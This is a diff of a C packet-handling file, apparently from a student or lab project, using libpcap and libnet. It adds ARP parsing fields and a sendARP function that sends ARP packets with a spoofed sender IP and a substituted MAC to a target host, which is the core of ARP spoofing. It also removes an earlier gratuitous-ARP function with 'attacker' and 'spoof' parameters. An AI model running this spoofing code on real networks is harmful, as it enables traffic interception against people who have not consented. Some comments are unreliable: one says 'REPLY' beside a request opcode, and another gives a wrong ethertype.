@@ -10,17 +10,39 @@
 
 #include "packetManage.h"
 
+
+
+int maccmp(struct libnet_ether_addr* mac1 , struct libnet_ether_addr* mac2){
+
+	int length=6;
+	
+	while(length-- > 0){
+		if(*(mac1->ether_addr_octet + length)!=*(mac2->ether_addr_octet + length))
+			return -1;
+	}
+	return 0;
+
+}
+
+
 int ARP_packet_construct(ARP_packet* arp,const struct pcap_pkthdr* packet_header,const u_char* packet){
-    
-	//ther ARP packet starts with the ethernet header.
-	//here is initialized
+
+    //ther ARP packet starts with the ethernet header.
+    //here is initialized
     arp->eth_header_t= (struct ether_header *) packet;
     if(ntohs(arp->eth_header_t->ether_type)!=ETHERTYPE_ARP){
-	    return -1;
+        return -1;
     }
 
+    // ARP packet type (1 request, 2 reply)
+    arp->type = (packet[14] << 8) + packet[15];
+
     //only for testing. must have its own function.
-    struct libnet_ether_addr* mac_src= (arp->eth_header_t)->ether_shost;
+
+    struct libnet_ether_addr* mac_src=calloc(sizeof(struct libnet_ether_addr),1);
+    memcpy(mac_src->ether_addr_octet,arp->eth_header_t->ether_shost,6);
+    arp->source=*mac_src;
+
     printf("MAC address source: %02X:%02X:%02X:%02X:%02X:%02X    ",\
 		    mac_src->ether_addr_octet[0],\
 		    mac_src->ether_addr_octet[1],\
@@ -29,7 +51,10 @@ int ARP_packet_construct(ARP_packet* arp,const struct pcap_pkthdr* packet_header
 		    mac_src->ether_addr_octet[4],\
 		    mac_src->ether_addr_octet[5]);
 
-    struct libnet_ether_addr* mac_dst= (arp->eth_header_t)->ether_dhost;
+    struct libnet_ether_addr* mac_dst=calloc(sizeof(struct libnet_ether_addr),1);
+    memcpy(mac_dst->ether_addr_octet,arp->eth_header_t->ether_dhost,6);
+    arp->target=*mac_dst;
+
     printf("MAC address destination: %02X:%02X:%02X:%02X:%02X:%02X\n",\
 		    mac_dst->ether_addr_octet[0],\
 		    mac_dst->ether_addr_octet[1],\
@@ -38,11 +63,13 @@ int ARP_packet_construct(ARP_packet* arp,const struct pcap_pkthdr* packet_header
 		    mac_dst->ether_addr_octet[4],\
 		    mac_dst->ether_addr_octet[5]);
 
-	// the arp header is initialized
+    // the arp header is initialized
     arp->arp_header_t= (struct ether_arp *) (packet + ETHER_ADDR_LEN+ETHER_ADDR_LEN+2);
 
-    return 0;
 
+
+
+    return 0;
 
 }
 
@@ -96,60 +123,27 @@ int TCP_packet_construct(TCP_packet* tcp,const struct pcap_pkthdr* packet_header
 	return 0;
 }
 
+void sendARP(struct libnet_ether_addr* macSend,struct in_addr ipSend ,struct in_addr ipSpoof ,struct libnet_ether_addr* macReplace,libnet_t* l){
 
-/**
- * @brief Constructs a gratuitous ARP packet with the given parameters.
- *
- * @param[in] ip_atk    The attacker IP address.
- * @param[in] mac_atk   The attacker MAC address.
- * @param[in] ip_fake   Spoofed IP address.
- * @param[in] ip_trg    The target IP address.
- * @param[in] mac_trg   The target MAC address.
- * @param[in] ip_brd    The broadcast IP address.
- * @param[in] l         The libnet context.
- */
-void ARP_gratuitous_request(
-    struct in_addr* ip_atk,
-    struct libnet_ether_addr* mac_atk,
-    struct in_addr* ip_fake,
-    struct in_addr* ip_trg,
-    struct libnet_ether_addr* mac_trg,
-    struct in_addr* ip_brd,
-    libnet_t* l) {
+	LIBNET_API libnet_ptag_t arp = libnet_autobuild_arp (	ARPOP_REQUEST,	/* OP: REPLY */
+			(u_int8_t *) macReplace->ether_addr_octet,	/* MAC address of device used */
+			(u_int8_t *) &(ipSpoof).s_addr,	/* IP to spoof */
+			(u_int8_t *) macSend->ether_addr_octet,	/* MAC of the target */
+			(u_int8_t *) &(ipSend).s_addr,	/* IP address of the target */
+			l);	/* libnet context */
 
-    // Allocate memory
-    u_int8_t* ip_attacker   = calloc(sizeof(u_int8_t), 4);
-    u_int8_t* mac_attacker  = calloc(sizeof(u_int8_t), 6);
-    u_int8_t* ip_spoof      = calloc(sizeof(u_int8_t), 4);
-    u_int8_t* ip_target     = calloc(sizeof(u_int8_t), 4);
-    u_int8_t* mac_target    = calloc(sizeof(u_int8_t), 6);
-    u_int8_t* ip_broadcast  = calloc(sizeof(u_int8_t), 6);
+	LIBNET_API libnet_ptag_t eth = libnet_build_ethernet (	(u_int8_t *) &macSend->ether_addr_octet,	/* MAC address of the target */
+			(u_int8_t *) macReplace->ether_addr_octet,	/* MAC address of device used */
+			ETHERTYPE_ARP,		/* Ethertype ARP: 0x8006 */
+			NULL,			/* No payload */
+			0,			/* No payload */
+			l,			/* libnet context */
+			0);			/* No libnet protocol tag */
 
-    // Add values
-    ip_attacker     = (u_int8_t*) &(ip_atk -> s_addr);
-    mac_attacker    = (u_int8_t*) &(mac_atk -> ether_addr_octet);
-    ip_spoof        = (u_int8_t*) &(ip_fake -> s_addr);
-    ip_target       = (u_int8_t*) &(ip_trg -> s_addr);
-    mac_target      = (u_int8_t*) &(mac_trg -> ether_addr_octet);
-    ip_broadcast    = (u_int8_t*) &(ip_brd -> s_addr);
-
-    // Libnet autobuild
-
-    // Build ARP request
-    libnet_ptag_t arp = 0;
-    arp = libnet_autobuild_arp(ARPOP_REQUEST, mac_attacker, ip_attacker, ip_broadcast, ip_target, l);
-
-    // Build Ethernet header
-    libnet_ptag_t eth = 0;
-    eth = libnet_autobuild_ethernet(ip_broadcast, ETHERTYPE_ARP, l);
-
-    // Send packet
-    libnet_write(l);
-
-    // libnet_write(l);    // TODO: solve SEGMENTATION FAULT
+	libnet_write (l);
 }
 
-
+//print payload from tcp packets
 void printPayload(const u_char* payload, int payload_length){
 	if (payload_length > 0) {
 		const u_char *temp_pointer = payload;
